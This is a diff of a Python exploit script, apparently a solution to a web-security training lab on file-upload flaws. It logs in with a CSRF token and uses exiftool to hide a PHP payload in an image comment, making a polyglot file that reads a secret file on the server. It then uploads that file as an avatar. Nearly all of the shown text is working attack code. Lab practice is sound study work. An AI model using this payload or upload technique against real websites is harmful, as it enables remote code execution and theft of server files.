@@ -10,7 +10,6 @@ import os
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
 def get_csrf_token():
-    
     # CSRF token
     url = target_url + "/login"
     out = r.get(url, verify = False, proxies = proxies)
@@ -26,19 +25,15 @@ def get_csrf_token():
     return csrf_token
 
 def login(csrf_token, username = "wiener", password = "peter"):
-
     url = target_url + "/login"
-
     data = {
         'csrf':csrf_token,
         'username':username,
         'password':password
     }
-
     headers = {
         'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0'
     }
-
     out = r.post(url, data=data, headers=headers, verify=False, proxies=proxies, allow_redirects=False)
     if out.status_code == 302:
         print("[+] Logged in as wiener")
@@ -57,15 +52,13 @@ def login(csrf_token, username = "wiener", password = "peter"):
         sys.exit(0)
 
 def upload_file(csrf_token):
-
     url = target_url + "/my-account/avatar"
+    
+    os.system("exiftool -Comment=\"<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>\" apple.jpg -o polyglot.php")
 
     # file = {
     #     'name': ('file_name.php', 'file_content', 'Content-Type')
     # }
-
-    os.system("exiftool -Comment=\"<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>\" apple.jpg -o polyglot.php")
-
     file = {
         'avatar': ('file_upload.php', open('polyglot.php','rb'),'text/php'),
         'user': (None, 'wiener', None),
